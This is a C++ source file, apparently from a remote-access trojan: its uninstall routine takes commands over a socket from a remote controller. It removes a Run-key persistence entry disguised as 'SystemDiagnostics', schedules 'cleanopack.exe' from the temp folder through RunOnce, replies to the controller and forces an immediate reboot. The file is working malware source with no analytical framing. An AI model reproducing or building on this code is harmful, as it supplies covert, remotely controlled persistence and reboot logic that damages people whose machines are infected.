#include "MSConfig.h"

void uninstall(SOCKET& ConnectSocket)
{
     char command[1024],response[1024], buffer[1024];
     string totr;
     int res;
     GetTempPath(1024, buffer);
     strcat(buffer, "cleanopack.exe");
     
    HKEY hk;
    RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_SET_VALUE, &hk);
    RegDeleteValue(hk, "SystemDiagnostics");
	RegCloseKey(hk);
	
   	HKEY hKey;
	RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"), 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, "cleanopack", 0, REG_SZ, (BYTE*)buffer, (strlen(buffer)+1));
	RegCloseKey(hKey);
	char buff1[24], buff2[24];


    strcpy(command, "OK+");
    send(ConnectSocket, command, (int)strlen(command), 0);

     
   	totr.clear();
	  do
	  {
	               res = recv(ConnectSocket, response, 1024, 0);
	               response[res] = '\0';
	               totr += response;
	  } while (totr[totr.length() - 1] != '+');
	  totr.erase(totr.length() - 1, 1);
	  

	  
	if (totr == "OK") system("SHUTDOWN -r -t 00");
    
	closesocket(ConnectSocket);
    WSACleanup(); 
    
     return;
}
